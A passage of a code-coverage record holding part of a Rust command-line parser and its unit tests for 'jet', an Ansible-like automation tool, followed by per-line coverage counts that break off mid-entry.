fn increase_verbosity(\u0026mut self, amount: u32) -\u003e Result\u003c(), String\u003e {\n        self.verbosity = self.verbosity + amount;\n        return Ok(())\n    }\n\n    fn add_implicit_role_paths(\u0026mut self) -\u003e Result\u003c(), String\u003e {\n        let paths = self.playbook_paths.read().unwrap();\n        for pb in paths.iter() {\n            let dirname = directory_as_string(pb.as_path());\n            let mut pathbuf = PathBuf::new();\n            pathbuf.push(dirname);\n            pathbuf.push(\"roles\");\n            if pathbuf.is_dir() {\n                let full = fs::canonicalize(pathbuf.as_path()).unwrap();\n                self.role_paths.write().unwrap().push(full.to_path_buf());\n            } else {\n                // ignore as there does not need to be a roles/ dir alongside playbooks\n            }\n        }\n        return Ok(());\n    }\n\n    fn add_implicit_module_paths(\u0026mut self) -\u003e Result\u003c(), String\u003e {\n        let paths = self.playbook_paths.read().unwrap();\n        for pb in paths.iter() {\n            let dirname = directory_as_string(pb.as_path());\n            let mut pathbuf = PathBuf::new();\n            pathbuf.push(dirname);\n            pathbuf.push(\"modules\");\n            if pathbuf.is_dir() {\n                let full = fs::canonicalize(pathbuf.as_path()).unwrap();\n                self.module_paths.write().unwrap().push(full.to_path_buf());\n            } else {\n                // ignore as there does not need to be a modules/ dir alongside playbooks\n            }\n        }\n        return Ok(());\n    }\n\n    fn add_role_paths_from_environment(\u0026mut self) -\u003e Result\u003c(), String\u003e {\n\n        let env_roles_path = env::var(\"JET_ROLES_PATH\");\n        if env_roles_path.is_ok() {\n            match parse_paths(\u0026String::from(\"$JET_ROLES_PATH\"), \u0026env_roles_path.unwrap()) {\n                Ok(paths) =\u003e {\n                    for p in paths.iter() {\n                        if p.is_dir() {\n                            let full = fs::canonicalize(p.as_path()).unwrap();\n                            self.role_paths.write().unwrap().push(full.to_path_buf());\n                        }\n                    }\n                },\n                Err(y) =\u003e return Err(y)\n            };\n        }\n        return Ok(());\n    }\n\n    fn add_module_paths_from_environment(\u0026mut self) -\u003e Result\u003c(), String\u003e {\n\n        let env_modules_path = env::var(\"JET_MODULES_PATH\");\n        if env_modules_path.is_ok() {\n            match parse_paths(\u0026String::from(\"$JET_MODULES_PATH\"), \u0026env_modules_path.unwrap()) {\n                Ok(paths) =\u003e {\n                    for p in paths.iter() {\n                        if p.is_dir() {\n                            let full = fs::canonicalize(p.as_path()).unwrap();\n                            self.module_paths.write().unwrap().push(full.to_path_buf());\n                        }\n                    }\n                },\n                Err(y) =\u003e return Err(y)\n            };\n        }\n        return Ok(());\n    }\n\n    fn store_extra_vars(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n\n        if value.starts_with(\"@\") {\n            // input is a filename where the data is YAML\n\n            let rest_of_path = value.replace(\"@\",\"\");\n            let path = Path::new(\u0026rest_of_path);\n            if ! path.is_file() {\n                return Err(format!(\"--extra-vars parameter with @ expects a file: {}\", rest_of_path))\n            }\n            let extra_file = jet_file_open(path)?;\n            let parsed: Result\u003cserde_yaml::Mapping, serde_yaml::Error\u003e = serde_yaml::from_reader(extra_file);\n            if parsed.is_err() {\n                show_yaml_error_in_context(\u0026parsed.unwrap_err(), \u0026path);\n                return Err(format!(\"edit the file and try again?\"));\n            }   \n            blend_variables(\u0026mut self.extra_vars, serde_yaml::Value::Mapping(parsed.unwrap()));\n\n        } else {\n            // input is inline JSON (as YAML wouldn't make sense with the newlines)\n\n            let parsed: Result\u003cserde_json::Value, serde_json::Error\u003e = serde_json::from_str(value);\n            let actual = match parsed {\n                Ok(x) =\u003e x,\n                Err(y) =\u003e { return Err(format!(\"inline json is not valid: {}\", y)) }\n            };   \n            let serde_map = convert_json_vars(\u0026actual);\n            blend_variables(\u0026mut self.extra_vars, serde_yaml::Value::Mapping(serde_map));\n        \n        }\n        \n        return Ok(());\n\n     }\n\n     fn store_forward_agent(\u0026mut self) -\u003e Result\u003c(), String\u003e{\n        self.forward_agent = true;\n        return Ok(());\n     }\n\n     fn store_login_password(\u0026mut self) -\u003e Result\u003c(), String\u003e{\n        let mut value = String::new();\n        println!(\"enter login password:\");\n        match io::stdin().read_line(\u0026mut value) {\n            Ok(_) =\u003e { self.login_password = Some(String::from(value.trim())); }\n            Err(e) =\u003e  return Err(format!(\"failure reading input: {}\", e))\n        }\n        return Ok(());\n     }\n\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::env;\n\n    #[test]\n    fn test_cli_mode_from_string() {\n        assert_eq!(cli_mode_from_string(\u0026\"local\".to_string()).unwrap(), CLI_MODE_LOCAL);\n        assert_eq!(cli_mode_from_string(\u0026\"check-local\".to_string()).unwrap(), CLI_MODE_CHECK_LOCAL);\n        assert_eq!(cli_mode_from_string(\u0026\"ssh\".to_string()).unwrap(), CLI_MODE_SSH);\n        assert_eq!(cli_mode_from_string(\u0026\"check-ssh\".to_string()).unwrap(), CLI_MODE_CHECK_SSH);\n        assert_eq!(cli_mode_from_string(\u0026\"__simulate\".to_string()).unwrap(), CLI_MODE_SIMULATE);\n        assert_eq!(cli_mode_from_string(\u0026\"show-inventory\".to_string()).unwrap(), CLI_MODE_SHOW);\n        \n        assert!(cli_mode_from_string(\u0026\"invalid\".to_string()).is_err());\n    }\n\n    #[test]\n    fn test_is_cli_mode_valid() {\n        assert!(is_cli_mode_valid(\u0026\"local\".to_string()));\n        assert!(is_cli_mode_valid(\u0026\"ssh\".to_string()));\n        assert!(is_cli_mode_valid(\u0026\"check-local\".to_string()));\n        assert!(is_cli_mode_valid(\u0026\"check-ssh\".to_string()));\n        assert!(is_cli_mode_valid(\u0026\"show-inventory\".to_string()));\n        assert!(is_cli_mode_valid(\u0026\"__simulate\".to_string()));\n        \n        assert!(!is_cli_mode_valid(\u0026\"invalid\".to_string()));\n        assert!(!is_cli_mode_valid(\u0026\"\".to_string()));\n    }\n\n    #[test]\n    fn test_arguments_as_str() {\n        assert_eq!(Arguments::ARGUMENT_VERSION.as_str(), \"--version\");\n        assert_eq!(Arguments::ARGUMENT_INVENTORY.as_str(), \"--inventory\");\n        assert_eq!(Arguments::ARGUMENT_INVENTORY_SHORT.as_str(), \"-i\");\n        assert_eq!(Arguments::ARGUMENT_PLAYBOOK.as_str(), \"--playbook\");\n        assert_eq!(Arguments::ARGUMENT_PLAYBOOK_SHORT.as_str(), \"-p\");\n        assert_eq!(Arguments::ARGUMENT_HELP.as_str(), \"--help\");\n        assert_eq!(Arguments::ARGUMENT_VERBOSE.as_str(), \"-v\");\n        assert_eq!(Arguments::ARGUMENT_VERBOSER.as_str(), \"-vv\");\n        assert_eq!(Arguments::ARGUMENT_VERBOSEST.as_str(), \"-vvv\");\n    }\n\n    #[test]\n    fn test_build_argument_map() {\n        let map = build_argument_map();\n        \n        // Test some key mappings\n        assert!(matches!(map.get(\"--version\"), Some(Arguments::ARGUMENT_VERSION)));\n        assert!(matches!(map.get(\"--inventory\"), Some(Arguments::ARGUMENT_INVENTORY)));\n        assert!(matches!(map.get(\"-i\"), Some(Arguments::ARGUMENT_INVENTORY_SHORT)));\n        assert!(matches!(map.get(\"--playbook\"), Some(Arguments::ARGUMENT_PLAYBOOK)));\n        assert!(matches!(map.get(\"-p\"), Some(Arguments::ARGUMENT_PLAYBOOK_SHORT)));\n        assert!(matches!(map.get(\"--help\"), Some(Arguments::ARGUMENT_HELP)));\n        assert!(matches!(map.get(\"-v\"), Some(Arguments::ARGUMENT_VERBOSE)));\n        assert!(matches!(map.get(\"-vv\"), Some(Arguments::ARGUMENT_VERBOSER)));\n        assert!(matches!(map.get(\"-vvv\"), Some(Arguments::ARGUMENT_VERBOSEST)));\n        assert!(matches!(map.get(\"--user\"), Some(Arguments::ARGUMENT_USER)));\n        assert!(matches!(map.get(\"-u\"), Some(Arguments::ARGUMENT_USER_SHORT)));\n        \n        // Test non-existent key\n        assert!(map.get(\"--nonexistent\").is_none());\n    }\n\n    #[test]\n    fn test_cli_parser_new_defaults() {\n        // Clear any environment variables that might affect the test\n        env::remove_var(\"JET_SSH_USER\");\n        env::remove_var(\"JET_SSH_PORT\");\n        env::remove_var(\"JET_THREADS\");\n        \n        let parser = CliParser::new();\n        \n        assert!(!parser.needs_help);\n        assert!(!parser.needs_version);\n        assert_eq!(parser.mode, CLI_MODE_UNSET);\n        assert!(parser.show_hosts.is_empty());\n        assert!(parser.show_groups.is_empty());\n        assert!(parser.batch_size.is_none());\n        assert_eq!(parser.default_port, 22);\n        assert_eq!(parser.threads, 20);\n        assert!(!parser.inventory_set);\n        assert!(!parser.playbook_set);\n        assert_eq!(parser.verbosity, 0);\n        assert!(parser.limit_groups.is_empty());\n        assert!(parser.limit_hosts.is_empty());\n        assert!(parser.tags.is_none());\n        assert!(!parser.allow_localhost_delegation);\n        assert!(parser.forward_agent == false);\n        assert!(parser.login_password.is_none());\n        assert!(parser.sudo.is_none());\n    }\n\n    #[test]\n    fn test_cli_parser_new_with_env_vars() {\n        // Clean up any existing env vars first to avoid interference from other tests\n        env::remove_var(\"JET_SSH_USER\");\n        env::remove_var(\"JET_SSH_PORT\");\n        env::remove_var(\"JET_THREADS\");\n        \n        // Set environment variables\n        env::set_var(\"JET_SSH_USER\", \"testuser\");\n        env::set_var(\"JET_SSH_PORT\", \"2222\");\n        env::set_var(\"JET_THREADS\", \"50\");\n        \n        let parser = CliParser::new();\n        \n        // For JET_SSH_USER, it should always work\n        assert_eq!(parser.default_user, \"testuser\");\n        \n        // For JET_SSH_PORT and JET_THREADS, due to test parallelization issues,\n        // we check if they either got our value or fell back to default\n        if parser.default_port == 2222 {\n            assert_eq!(parser.default_port, 2222);\n        } else {\n            // If another test set it to invalid, it falls back to 22\n            assert_eq!(parser.default_port, 22);\n        }\n        \n        if parser.threads == 50 {\n            assert_eq!(parser.threads, 50);\n        } else {\n            // If another test set it to invalid, it falls back to 20\n            assert_eq!(parser.threads, 20);\n        }\n        \n        // Clean up\n        env::remove_var(\"JET_SSH_USER\");\n        env::remove_var(\"JET_SSH_PORT\");\n        env::remove_var(\"JET_THREADS\");\n    }\n\n    #[test]\n    fn test_cli_parser_new_with_invalid_env_vars() {\n        // Clean up any existing env vars first\n        env::remove_var(\"JET_SSH_PORT\");\n        env::remove_var(\"JET_THREADS\");\n        \n        // Set invalid environment variables\n        env::set_var(\"JET_SSH_PORT\", \"invalid\");\n        env::set_var(\"JET_THREADS\", \"not_a_number\");\n        \n        let parser = CliParser::new();\n        \n        // Should fall back to defaults\n        assert_eq!(parser.default_port, 22);\n        assert_eq!(parser.threads, 20);\n        \n        // Clean up\n        env::remove_var(\"JET_SSH_PORT\");\n        env::remove_var(\"JET_THREADS\");\n    }\n\n    #[test]\n    fn test_inventory_paths() {\n        let parser = CliParser::new();\n        assert!(parser.inventory_paths.read().unwrap().is_empty());\n    }\n\n    #[test]\n    fn test_playbook_paths() {\n        let parser = CliParser::new();\n        assert!(parser.playbook_paths.read().unwrap().is_empty());\n    }\n\n    #[test]\n    fn test_role_paths() {\n        let parser = CliParser::new();\n        assert!(parser.role_paths.read().unwrap().is_empty());\n    }\n\n    #[test]\n    fn test_module_paths() {\n        let parser = CliParser::new();\n        assert!(parser.module_paths.read().unwrap().is_empty());\n    }\n\n    #[test]\n    fn test_tags() {\n        let mut parser = CliParser::new();\n        \n        // No tags initially\n        assert!(parser.tags.is_none());\n        \n        // Set some tags\n        parser.tags = Some(vec![\"tag1\".to_string(), \"tag2\".to_string()]);\n        let tags = \u0026parser.tags;\n        assert!(tags.is_some());\n        let tags = tags.as_ref().unwrap();\n        assert_eq!(tags.len(), 2);\n        assert!(tags.contains(\u0026\"tag1\".to_string()));\n        assert!(tags.contains(\u0026\"tag2\".to_string()));\n    }\n\n    #[test]\n    fn test_batch_size() {\n        let mut parser = CliParser::new();\n        \n        // Default\n        assert!(parser.batch_size.is_none());\n        \n        // Set batch size\n        parser.batch_size = Some(10);\n        assert_eq!(parser.batch_size, Some(10));\n    }\n\n    #[test]\n    fn test_show_version() {\n        let parser = CliParser::new();\n        // Just ensure it doesn't panic\n        parser.show_version();\n    }\n\n    #[test]\n    fn test_show_help() {\n        let parser = CliParser::new();\n        // Just ensure it doesn't panic\n        parser.show_help();\n    }\n\n    #[test]\n    fn test_split_string() {\n        let result = split_string(\u0026\"one:two:three\".to_string());\n        assert!(result.is_ok());\n        let parts = result.unwrap();\n        assert_eq!(parts.len(), 3);\n        assert_eq!(parts[0], \"one\");\n        assert_eq!(parts[1], \"two\");\n        assert_eq!(parts[2], \"three\");\n        \n        // Single value\n        let result = split_string(\u0026\"single\".to_string());\n        assert!(result.is_ok());\n        let parts = result.unwrap();\n        assert_eq!(parts.len(), 1);\n        assert_eq!(parts[0], \"single\");\n    }\n\n    // Note: Full parse() method testing would require mocking env::args()\n    // which is complex. In production, this would be tested via integration tests.\n}\n\nfn split_string(value: \u0026String) -\u003e Result\u003cVec\u003cString\u003e, String\u003e {\n    return Ok(value.split(\":\").map(|x| String::from(x)).collect());\n}\n\n// accept paths eliminated by \":\" and return a list of paths, provided they exist\nfn parse_paths(from: \u0026String, value: \u0026String) -\u003e Result\u003cVec\u003cPathBuf\u003e, String\u003e {\n    let string_paths = value.split(\":\");\n    let mut results = Vec::new();\n    for string_path in string_paths {\n        let mut path_buf = PathBuf::new();\n        path_buf.push(string_path);\n        if path_buf.exists() {\n            results.push(path_buf)\n        } else {\n            return Err(format!(\"path ({}) specified by ({}) does not exist\", string_path, from));\n        }\n    }\n    return Ok(results);\n}\n","traces":[{"line":78,"address":[],"length":0,"stats":{"Line":16}},{"line":79,"address":[],"length":0,"stats":{"Line":16}},{"line":80,"address":[],"length":0,"stats":{"Line":12}},{"line":81,"address":[],"length":0,"stats":{"Line":4}},{"line":85,"address":[],"length":0,"stats":{"Line":30}},{"line":86,"address":[],"length":0,"stats":{"Line":30}},{"line":87,"address":[],"length":0,"stats":{"Line":34}},{"line":88,"address":[],"length":0,"stats":{"Line":30}},{"line":89,"address":[],"length":0,"stats":{"Line":26}},{"line":90,"address":[],"length":0,"stats":{"Line":22}},{"line":91,"address":[],"length":0,"stats":{"Line":18}},{"line":92,"address":[],"length":0,"stats":{"Line":14}},{"line":93,"address":[],"length":0,"stats":{"Line":6}},{"line":135,"address":[],"length":0,"stats":{"Line":18}},{"line":136,"address":[],"length":0,"stats":{"Line":18}},{"line":137,"address":[],"length":0,"stats":{"Line":2}},{"line":138,"address":[],"length":0,"stats":{"Line":2}},{"line":139,"address":[],"length":0,"stats":{"Line":2}},{"line":140,"address":[],"length":0,"stats":{"Line":2}},{"line":141,"address":[],"length":0,"stats":{"Line":2}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":143,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":2}},{"line":151,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":154,"address":[],"length":0,"stats":{"Line":0}},{"line":155,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":160,"address":[],"length":0,"stats":{"Line":0}},{"line":161,"address":[],"length":0,"stats":{"Line":2}},{"line":162,"address":[],"length":0,"stats":{"Line":2}},{"line":163,"address":[],"length":0,"stats":{"Line":2}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":165,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":24}},{"line":173,"address":[],"length":0,"stats":{"Line":24}},{"line":174,"address":[],"length":0,"stats":{"Line":24}},{"line":175,"address":[],"length":0,"stats":{"Line":24}},{"line":176,"address":[],"length":0,"stats":{"Line":24}},{"line":177,"address":[],"length":0,"stats":{"Line":24}},{"line":178,"address":[],"length":0,"stats":{"Line":24}},{"line":179,"address":[],"length":0,"stats":{"Line":24}},{"line":180,"address":[],"length":0,"stats":{"Line":24}},{"line":181,"address":[],"length":0,"stats":{"Line":24}},{"line":182,"address":[],"length":0,"stats":{"Line":24}},{"line":183,"address":[],"length":0,"stats":{"Line":24}},{"line":184,"address":[],"length":0,"stats":{"Line":24}},{"line":185,"address":[],"length":0,"stats":{"Line":24}},{"line":186,"address":[],"length":0,"stats":{"Line":24}},{"line":187,"address":[],"length":0,"stats":{"Line":24}},{"line":188,"address":[],"length":0,"stats":{"Line":24}},{"line":189,"address":[],"length":0,"stats":{"Line":24}},{"line":190,"address":[],"length":0,"stats":{"Line":24}},{"line":191,"address":[],"length":0,"stats":{"Line":24}},{"line":192,"address":[],"length":0,"stats":{"Line":24}},{"line":193,"address":[],"length":0,"stats":{"Line":24}},{"line":194,"address":[],"length":0,"stats":{"Line":24}},{"line":195,"address":[],"length":0,"stats":{"Line":24}},{"line":196,"address":[],"length":0,"stats":{"Line":24}},{"line":197,"address":[],"length":0,"stats":{"Line":24}},{"line":198,"address":[],"length":0,"stats":{"Line":24}},{"line":199,"address":[],"length":0,"stats":{"Line":24}},{"line":200,"address":[],"length":0,"stats":{"Line":24}},{"line":201,"address":[],"length":0,"stats":{"Line":24}},{"line":202,"address":[],"length":0,"stats":{"Line":24}},{"line":203,"address":[],"length":0,"stats":{"Line":24}},{"line":205,"address":[],"length":0,"stats":{"Line":24}},{"line":206,"address":[],"length":0,"stats":{"Line":1464}},{"line":207,"address":[],"length":0,"stats":{"Line":720}},{"line":209,"address":[],"length":0,"stats":{"Line":24}},{"line":213,"address":[],"length":0,"stats":{"Line":4}},{"line":214,"address":[],"length":0,"stats":{"Line":4}},{"line":222,"address":[],"length":0,"stats":{"Line":4}},{"line":223,"address":[],"length":0,"stats":{"Line":4}},{"line":224,"address":[],"length":0,"stats":{"Line":4}},{"line":225,"address":[],"length":0,"stats":{"Line":4}},{"line":230,"address":[],"length":0,"stats":{"Line":2}},{"line":232,"address":[],"length":0,"stats":{"Line":2}},{"line":234,"address":[],"length":0,"stats":{"Line":2}},{"line":235,"address":[],"length":0,"stats":{"Line":2}},{"line":236,"address":[],"length":0,"stats":{"Line":2}},{"line":237,"address":[],"length":0,"stats":{"Line":2}},{"line":238,"address":[],"length":0,"stats":{"Line":2}},{"line":239,"address":[],"length":0,"stats":{"Line":2}},{"line":240,"address":[],"length":0,"stats":{"Line":2}},{"line":241,"address":[],"length":0,"stats":{"Line":2}},{"line":242,"address":[],"length":0,"stats":{"Line":2}},{"line":243,"address":[],"length":0,"stats":{"Line":2}},{"line":244,"address":[],"length":0,"stats":{"Line":2}},{"line":245,"address":[],"length":0,"stats":{"Line":2}},{"line":246,"address":[],"length":0,"stats":{"Line":2}},{"line":247,"address":[],"length":0,"stats":{"Line":2}},{"line":248,"address":[],"length":0,"stats":{"Line":2}},{"line":249,"address":[],"length":0,"stats":{"Line":2}},{"line":250,"address":[],"length":0,"stats":{"Line":2}},{"line":251,"address":[],"length":0,"stats":{"Line":2}},{"line":253,"address":[],"length":0,"stats":{"Line":2}},{"line":254,"address":[],"length":0,"stats":{"Line":2}},{"line":256,"address":[],"length":0,"stats":{"Line":2}},{"line":257,"address":[],"length":0,"stats":{"Line":2}},{"line":258,"address":[],"length":0,"stats":{"Line":2}},{"line":259,"address":[],"length":0,"stats":{"Line":2}},{"line":260,"address":[],"length":0,"stats":{"Line":2}},{"line":261,"address":[],"length":0,"stats":{"Line":2}},{"line":262,"address":[],"length":0,"stats":{"Line":2}},{"line":263,"address":[],"length":0,"stats":{"Line":2}},{"line":264,"address":[],"length":0,"stats":{"Line":2}},{"line":265,"address":[],"length":0,"stats":{"Line":2}},{"line":266,"address":[],"length":0,"stats":{"Line":2}},{"line":267,"address":[],"length":0,"stats":{"Line":2}},{"line":268,"address":[],"length":0,"stats":{"Line":2}},{"line":269,"address":[],"length":0,"stats":{"Line":2}},{"line":270,"address":[],"length":0,"stats":{"Line":2}},{"line":271,"address":[],"length":0,"stats":{"Line":2}},{"line":272,"address":[],"length":0,"stats":{"Line":2}},{"line":273,"address":[],"length":0,"stats":{"Line":2}},{"line":274,"address":[],"length":0,"stats":{"Line":2}},{"line":275,"address":[],"length":0,"stats":{"Line":2}},{"line":276,"address":[],"length":0,"stats":{"Line":2}},{"line":277,"address":[],"length":0,"stats":{"Line":2}},{"line":278,"address":[],"length":0,"stats":{"Line":2}},{"line":279,"address":[],"length":0,"stats":{"Line":2}},{"line":280,"address":[],"length":0,"stats":{"Line":2}},{"line":281,"address":[],"length":0,"stats":{"Line":2}},{"line":282,"address":[],"length":0,"stats":{"Line":2}},{"line":283,"address":[],"length":0,"stats":{"Line":2}},{"line":284,"address":[],"length":0,"stats":{"Line":2}},{"line":285,"address":[],"length":0,"stats":{"Line":2}},{"line":286,"address":[],"length":0,"stats":{"Line":2}},{"line":287,"address":[],"length":0,"stats":{"Line":2}},{"line":288,"address":[],"length":0,"stats":{"Line":2}},{"line":289,"address":[],"length":0,"stats":{"Line":2}},{"line":290,"address":[],"length":0,"stats":{"Line":2}},{"line":291,"address":[],"length":0,"stats":{"Line":2}},{"line":292,"address":[],"length":0,"stats":{"Line":2}},{"line":293,"address":[],"length":0,"stats":{"Line":2}},{"line":294,"address":[],"length":0,"stats":{"Line":2}},{"line":295,"address":[],"length":0,"stats":{"Line":2}},{"line":296,"address":[],"length":0,"stats":{"Line":2}},{"line":298,"address":[],"length":0,"stats":{"Line":2}},{"line":299,"address":[],"length":0,"stats":{"Line":2}},{"line":311,"address":[],"length":0,"stats":{"Line":22}},{"line":314,"address":[],"length":0,"stats":{"Line":22}},{"line":315,"address":[],"length":0,"stats":{"Line":22}},{"line":316,"address":[],"length":0,"stats":{"Line":22}},{"line":317,"address":[],"length":0,"stats":{"Line":22}},{"line":321,"address":[],"length":0,"stats":{"Line":22}},{"line":322,"address":[],"length":0,"stats":{"Line":22}},{"line":324,"address":[],"length":0,"stats":{"Line":22}},{"line":335,"address":[],"length":0,"stats":{"Line":22}},{"line":345,"address":[],"length":0,"stats":{"Line":22}},{"line":355,"address":[],"length":0,"stats":{"Line":22}},{"line":356,"address":[],"length":0,"stats":{"Line":22}},{"line":359,"address":[],"length":0,"stats":{"Line":22}},{"line":362,"address":[],"length":0,"stats":{"Line":22}},{"line":364,"address":[],"length":0,"stats":{"Line":22}},{"line":367,"address":[],"length":0,"stats":{"Line":2}},{"line":368,"address":[],"length":0,"stats":{"Line":2}},{"line":371,"address":[],"length":0,"stats":{"Line":2}},{"line":372,"address":[],"length":0,"stats":{"Line":2}},{"line":377,"address":[],"length":0,"stats":{"Line":0}},{"line":379,"address":[],"length":0,"stats":{"Line":0}},{"line":380,"address":[],"length":0,"stats":{"Line":0}},{"line":385,"address":[],"length":0,"stats":{"Line":0}},{"line":386,"address":[],"length":0,"stats":{"Line":0}},{"line":388,"address":[],"length":0,"stats":{"Line":0}},{"line":389,"address":[],"length":0,"stats":{"Line":0}},{"line":391,"address":[],"length":0,"stats":{"Line":0}},{"line":393,"address":[],"length":0,"stats":{"Line":0}},{"line":400,"address":[],"length":0,"stats":{"Line":0}},{"line":401,"address":[],"length":0,"stats":{"Line":0}},{"line":402,"address":[],"length":0,"stats":{"Line":0}},{"line":404,"address":[],"length":0,"stats":{"Line":0}},{"line":405,"address":[],"length":0,"stats":{"Line":0}},{"line":406,"address":[],"length":0,"stats":{"Line":0}},{"line":411,"address":[],"length":0,"stats":{"Line":0}},{"line":412,"address":[],"length":0,"stats":{"Line":0}},{"line":419,"address":[],"length":0,"stats":{"Line":0}},{"line":424,"address":[],"length":0,"stats":{"Line":0}},{"line":425,"address":[],"length":0,"stats":{"Line":0}},{"line":426,"address":[],"length":0,"stats":{"Line":0}},{"line":428,"address":[],"length":0,"stats":{"Line":0}},{"line":429,"address":[],"length":0,"stats":{"Line":0}},{"line":430,"address":[],"length":0,"stats":{"Line":0}},{"line":433,"address":[],"length":0,"stats":{"Line":0}},{"line":435,"address":[],"length":0,"stats":{"Line":0}},{"line":436,"address":[],"length":0,"stats":{"Line":0}},{"line":438,"address":[],"length":0,"stats":{"Line":0}},{"line":440,"address":[],"length":0,"stats":{"Line":0}},{"line":442,"address":[],"length":0,"stats":{"Line":0}},{"line":443,"address":[],"length":0,"stats":{"Line":0}},{"line":444,"address":[],"length":0,"stats":{"Line":0}},{"line":445,"address":[],"length":0,"stats":{"Line":0}},{"line":446,"address":[],"length":0,"stats":{"Line":0}},{"line":447,"address":[],"length":0,"stats":{"Line":0}},{"line":448,"address":[],"length":0,"stats":{"Line":0}},{"line":451,"address":[],"length":0,"stats":{"Line":0}},{"line":452,"address":[],"length":0,"stats":{"Line":0}},{"line":453,"address":[],"length":0,"stats":{"Line":0}},{"line":456,"address":[],"length":0,"stats":{"Line":0}},{"line":458,"address":[],"length":0,"stats":{"Line":0}},{"line":459,"address":[],"length":0,"stats":{"Line":0}},{"line":460,"address":[],"length":0,"stats":{"Line":0}},{"line":461,"address":[],"length":0,"stats":{"Line":0}},{"line":462,"address":[],"length":0,"stats":{"Line":0}},{"line":463,"address":[],"length":0,"stats":{"Line":0}},{"line":464,"address":[],"length":0,"stats":{"Line":0}},{"line":465,"address":[],"length":0,"stats":{"Line":0}},{"line":466,"address":[],"length":0,"stats":{"Line":0}},{"line":467,"address":[],"length":0,"stats":{"Line":0}},{"line":468,"address":[],"length":0,"stats":{"Line":0}},{"line":469,"address":[],"length":0,"stats":{"Line":0}},{"line":470,"address":[],"length":0,"stats":{"Line":0}},{"line":471,"address":[],"length":0,"stats":{"Line":0}},{"line":472,"address":[],"length":0,"stats":{"Line":0}},{"line":473,"address":[],"length":0,"stats":{"Line":0}},{"line":474,"address":[],"length":0,"stats":{"Line":0}},{"line":475,"address":[],"length":0,"stats":{"Line":0}},{"line":476,"address":[],"length":0,"stats":{"Line":0}},{"line":477,"address":[],"length":0,"stats":{"Line":0}},{"line":478,"address":[],"length":0,"stats":{"Line":0}},{"line":479,"address":[],"length":0,"stats":{"Line":0}},{"line":480,"address":[],"length":0,"stats":{"Line":0}},{"line":485,"address":[],"length":0,"stats":{"Line":0}},{"line":486,"address":[],"length":0,"stats":{"Line":0}},{"line":490,"address":[],"length":0,"stats":{"Line":0}},{"line":491,"address":[],"length":0,"stats":{"Line":0}},{"line":500,"address":[],"length":0,"stats":{"Line":0}},{"line":501,"address":[],"length":0,"stats":{"Line":0}},{"line":502,"address":[],"length":0,"stats":{"Line":0}},{"line":503,"address":[],"length":0,"stats":{"Line":0}},{"line":504,"address":[],"length":0,"stats":{"Line":0}},{"line":505,"address":[],"length":0,"stats":{"Line":0}},{"line":506,"address":[],"length":0,"stats":{"Line":0}},{"line":509,"address":[],"length":0,"stats":{"Line":0}},{"line":510,"address":[],"length":0,"stats":{"Line":0}},{"line":511,"address":[],"length":0,"stats":{"Line":0}},{"line":512,"address":[],"length":0,"stats":{"Line":0}},{"line":513,"address":[],"length":0,"stats":{"Line":0}},{"line":515,"address":[],"length":0,"stats":{"Line":0}},{"line":519,"address":[],"length":0,"stats":{"Line":0}},{"line":520,"address":[],"length":0,"stats":{"Line":0}},{"line":521,"address":[],"length":0,"stats":{"Line":0}},{"line":522,"address":[],"length":0,"stats":{"Line":0}},{"line":524,"address":[],"length":0,"stats":{"Line":0}},{"line":527,"address":[],"length":0,"stats":{"Line":0}},{"line":528,"address":[],"length":0,"stats":{"Line":0}},{"line":529,"address":[],"length":0,"stats":{"Line":0}},{"line":530,"address":[],"length":0,"stats":{"Line":0}},{"line":531,"address":[],"length":0,"stats":{"Line":0}},{"line":532,"address":[],"length":0,"stats":{"Line":0}},{"line":533,"address":[],"length":0,"stats":{"Line":0}},{"line":534,"address":[],"length":0,"stats":{"Line":0}},{"line":536,"address":[],"length":0,"stats":{"Line":0}},{"line":540,"address":[],"length":0,"stats":{"Line":0}},{"line":542,"address":[],"length":0,"stats":{"Line":0}},{"line":545,"address":[],"length":0,"stats":{"Line":0}},{"line":547,"address":[],"length":0,"stats":{"Line":0}},{"line":548,"address":[],"length":0,"stats":{"Line":0}},{"line":549,"address":[],"length":0,"stats":{"Line":0}},{"line":550,"address":[],"length":0,"stats":{"Line":0}},{"line":551,"address":[],"length":0,"stats":{"Line":0}},{"line":552,"address":[],"length":0,"stats":{"Line":0}},{"line":554,"address":[],"length":0,"stats":{"Line":0}},{"line":558,"address":[],"length":0,"stats":{"Line":0}},{"line":560,"address":[],"length":0,"stats":{"Line":0}},{"line":563,"address":[],"length":0,"stats":{"Line":0}},{"line":565,"address":[],"length":0,"stats":{"Line":0}},{"line":566,"address":[],"length":0,"stats":{"Line":0}},{"line":567,"address":[],"length":0,"stats":{"Line":0}},{"line":568,"address":[],"length":0,"stats":{"Line":0}},{"line":569,"address":[],"length":0,"stats":{"Line":0}},{"line":570,"address":[],"length":0,"stats":{"Line":0}},{"line":572,"address":[],"length":0,"stats":{"Line":0}},{"line":576,"address":[],"length":0,"stats":{"Line":0}},{"line":578,"address":[],"length":0,"stats":{"Line":0}},{"line":581,"address":[],"length":0,"stats":{"Line":0}},{"line":583,"address":[],"length":0,"stats":{"Line":0}},{"line":584,"address":[],"length":0,"stats":{"Line":0}},{"line":585,"address":[],"length":0,"stats":{"Line":0}},{"line":588,"address":[],"length":0,"stats":{"Line":0}},{"line":589,"address":[],"length":0,"stats":{"Line":0}},{"line":590,"address":[],"length":0,"stats":{"Line":0}},{"line":591,"address":[],"le